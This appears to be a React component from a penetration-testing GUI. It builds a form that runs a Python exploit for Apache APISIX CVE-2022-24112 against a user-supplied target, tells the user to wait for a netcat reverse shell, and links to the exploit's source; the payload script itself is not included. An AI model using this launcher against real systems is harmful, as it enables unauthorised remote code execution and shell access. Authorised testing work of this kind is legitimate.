import { Button, LoadingOverlay, NumberInput, Stack, TextInput } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useCallback, useState } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";
import { Child, Command } from "@tauri-apps/api/shell";
import { IconDoorExit } from "@tabler/icons";
import { UserGuide } from "../UserGuide/UserGuide";
import { SaveOutputToTextFile_v2 } from "../SaveOutputToFile/SaveOutputToTextFile"; //v2

/**
 * FormValues defines the structure of the object used to hold form state for network configuration.
 *
 * @field hostIP: The IP address of the host machine.
 * @field targetIP: The IP address of the target machine.
 * @field hostPort: The port number on the host machine used for communication.
 */
interface FormValuesType {
    hostIP: string;
    targetIP: string;
    hostPort: number;
}
// The title displayed in the user guide and form header
const title = "Apache-APISIX-2022-24112";
// Description used to inform the user about the exploit
const description_userguide =
    "Apache APISIX CVE-2022-24112: This tool allows exploitation of an IP restriction vulnerability in Apache APISIX \n" +
    "that can lead to remote code execution. The vulnerability is due to the default API key usage in combination with \n" +
    "the batch-requests plugin, allowing bypass of IP restrictions in the Admin API. Adjustments to the admin key or \n" +
    "port can reduce the attack's impact, but do not fully mitigate it.\n";

const steps =
    "Step 1: Enter a Host IP (enter your machineâ€™s IP for the reverse shell).\n" +
    "Step 2: Enter a Host Port (for reverse shell).\n" +
    "Step 3: Enter a Target IP or Hostname.\n" +
    "Step 4: Click Exploit to commence the exploits operation.\n" +
    "Step 5: View the Output block below to view the results of the attack vectors execution.\n";

const sourceLink = "https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112"; // Link to the source code.

/**
 * CVE20224112 is a React component that renders a form to execute
 * the Apache APISIX CVE-2022-24112 exploit.
 * It handles form submission, command execution, and output display.
 *
 * @returns A form component for executing the CVE-2022-24112 exploit.
 */
export function CVE202224112() {
    // State to manage the loading indicator visibility
    const [loading, setLoading] = useState(false);
    // State to store the handle of the spawned command process
    const [handle, setHandle] = useState<Child | null>(null);
    // State to store the command output
    const [output, setOutput] = useState("");
    // State to store the first status message
    const [text1, setText1] = useState<string | null>(null);
    // State to store the second status message
    const [text2, setText2] = useState<string | null>(null);
    // State to manage whether saving the output to a file is allowed
    const [allowSave, setAllowSave] = useState(false);
    // State to track if the output has been saved
    const [hasSaved, setHasSaved] = useState(false);

    // Initialize the form with default values
    let form = useForm({
        initialValues: {
            hostIP: "",
            targetIP: "",
            hostPort: 4444, // Default port for reverse shell
        },
    });
    /**
     * Handles form submission, executes the exploit command, and updates the output state.
     *
     * @param values - The form values containing host IP, target IP, and host port.
     */
    const onSubmit = async (values: FormValuesType) => {
        setLoading(true);

        // Disallow saving until the tool's execution is complete
        setAllowSave(false);

        // Define the command arguments to be executed
        const args = ["./exploits/CVE-2022-24112.py", values.targetIP, values.hostIP, `${values.hostPort}`];

        // Create a new command instance and spawn it
        const command = new Command("python3", args);
        const newHandle = await command.spawn();

        // Run the command and capture the output
        const output = await CommandHelper.runCommand("python3", args);

        // Update status texts with current operation information
        const text1 = `Attacking Target URL: ${values.targetIP}...`;
        const text2 = "Check your netcat listener for a reverse shell...";

        setText1(text1);
        setText2(text2);

        setHandle(newHandle);
        setOutput(output);
        setLoading(false);
        setAllowSave(true);
    };

    /**
     * Kills the currently running exploit command if there is one.
     */
    const killHandle = async () => {
        if (handle) {
            await handle.kill();
            setHandle(null);
            setText1(null);
            setText2(null);
        }
    };

    /**
     * Clears the output and resets save states.
     */
    const clearOutput = useCallback(() => {
        setOutput("");
        setHasSaved(false);
        setAllowSave(false);
    }, [setOutput]);

    /**
     * Callback for handling the completion of the output save operation.
     * Resets the save state to prevent duplicate saving.
     */
    const handleSaveComplete = () => {
        // Indicating that the file has saved which is passed
        // back into SaveOutputToTextFile to inform the user
        setHasSaved(true);
        setAllowSave(false);
    };

    return (
        <form onSubmit={form.onSubmit((values) => onSubmit({ ...values }))}>
            <LoadingOverlay visible={loading} />
            <Stack>
                {UserGuide(title, description_userguide)}
                <TextInput
                    label={"Host IP (your machine, for the reverse shell)"}
                    required
                    {...form.getInputProps("hostIP")}
                />
                <NumberInput label={"Host port (for reverse shell)"} {...form.getInputProps("hostPort")} />
                <TextInput label={"Target IP or Hostname"} required {...form.getInputProps("targetIP")} />

                <Button type={"submit"}>Exploit</Button>
                {SaveOutputToTextFile_v2(output, allowSave, hasSaved, handleSaveComplete)}
                <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
                {handle && (
                    <Button leftIcon={<IconDoorExit />} onClick={killHandle} color={"red"}>
                        Kill process
                    </Button>
                )}
            </Stack>
        </form>
    );
}
